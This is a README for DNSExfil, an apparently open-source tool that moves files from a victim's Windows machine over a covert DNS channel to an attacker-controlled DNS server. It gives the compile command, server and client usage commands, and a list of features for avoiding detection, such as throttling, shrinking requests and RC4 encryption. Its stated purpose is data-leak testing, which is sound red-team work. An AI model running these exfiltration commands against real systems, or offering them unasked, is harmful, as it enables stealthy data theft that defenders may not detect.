DNSExfil
============

Original Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

DNSExfil allows for transfering (*exfiltrate*) a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.

DNSExfil has two sides:
  1. The **server side**, coming as a single python script (`dnsexfil.py`), which acts as a custom DNS server, receiving the file
  2. The **client side** (*victim's side*), which comes in three flavors:
  - `dnsexfil.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable using this: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /out:dnsexfil.exe dnsexfil.cs
  - `dnsexfil.ps1`: a PowerShell script providing the exact same functionnalities by wrapping the DNSExfil assembly

In order for the whole thing to work **you must own a domain name** and set the DNS record (NS) for that domain to point to the server that will run the `dnsexfil.py` server side like below.
The A record content is the IP of your Cloud DNS server where dnsexfil.py is running and the NS content is the domain name of the same Cloud box.

<img src="https://github.com/Cyb3rC3lt/DNSExfil/blob/master/images/dnsentries.jpg" width="600">

Features
----------------------

By default, DNSExfil uses the system's  defined DNS server, but you can also set a specific one to use (*useful for debugging purposes or for running the server side locally for instance*).

Alternatively, using the `h` parameter, DNSExfil can perform DoH (*DNS over HTTP*) using the Google or CloudFlare DoH servers.

By default, the data to be exfiltrated is base64URL encoded in order to fit into DNS requests. However some DNS resolvers might break this encoding (*fair enough since FQDN are not supposed to case sensitve anyway*) by messing up with the sensitivity of the case (*upper or lower case*) which is obviously important for the encoding/decoding process. To circumvent this problem you can use the `-b32` flag in order to force Base32 encoding of the data, which comes with a little size overhead. If you're using CloudFlare DoH, base32 encoding is automatically applied.

DNSExfil supports **basic RC4 encryption** of the exfiltrated data, using the provided password to encrypt/decrypt the data.

DNSExfil also provides some optional features to avoid detection:
  - requests throttling in order to stay more stealthy when exfiltrating data
  - reduction of the DNS request size (*by default it will try to use as much bytes left available in each DNS request for efficiency*)
  - reduction of the DNS label size (*by default it will try to use the longest supported label size of 63 chars*)

<img src="https://dl.dropboxusercontent.com/s/z3hjd513jens17e/DNSExfil_04.jpg?dl=0" width="600">

Dependencies
----------------------

The only dependency is on the server side, as the `dnsexfil.py` script relies on the external **dnslib** library. You can install it using pip:
```
pip install -r requirements.txt
```

Usage
----------------------

***SERVER SIDE***

Start the `dnsexfil.py` script passing it the domain name or subdomain and decryption password to be used:
```
root@kali:~# ./dnsexfil.py -d subdomain.mydomain.com -p password
```

***CLIENT SIDE***

You can **either** use the compiled version, **or** the PowerShell wrapper (*which is basically the same thing*) **or** the JScript wrapper. In any case, the parameters are the same, with just a slight difference in the way of passing them in PowerShell.

1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
```
DNSExfil.exe <file> <domainName> <password> [-b32] [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
      file:           [MANDATORY] The file name to the file to be exfiltrated.
      domainName:     [MANDATORY] The domain name to use for DNS requests.
      password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
      -b32:           [OPTIONNAL] Use base32 encoding of data. Might be required by some DNS resolver break case.
      h:              [OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.
      DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
      throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
      requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
      labelMaxSize:   [OPTIONNAL] The maximum size in chars for each DNS request label (subdomain). Defaults to 63 chars.
```
<img src="https://dl.dropboxusercontent.com/s/jqzptt5tqc2e8z9/DNSExfil_01.jpg?dl=0" width="900">


2/ Using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
```
c:\DNSExfil> powershell
PS c:\DNSExfil> Import-Module .\dnsexfil.ps1
PS c:\DNSExfil> Invoke-DNSExfil -i inputFile -d subdomain.mydomain.com -p password -s my.dns.server.com -t 500
[...]
```
# Other examples

  ### Using the system's default DNS server, without any option
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password

  ### Using a specific DNS server
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134
  
  ### Using a specific DNS server, with throttling at 500ms
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -s 192.168.52.134 -t 500

  ### Limiting the DNS request size to a maximum of 150 bytes
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -r 150
  
  ### Limiting the label size to a maximum of 40 characters
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -l 40
  
  ### Using Google DoH (DNS over HTTP), without any option
    PS C:\> Invoke-DNSExfil -i anyFile -d mydomain.com -p password -h google
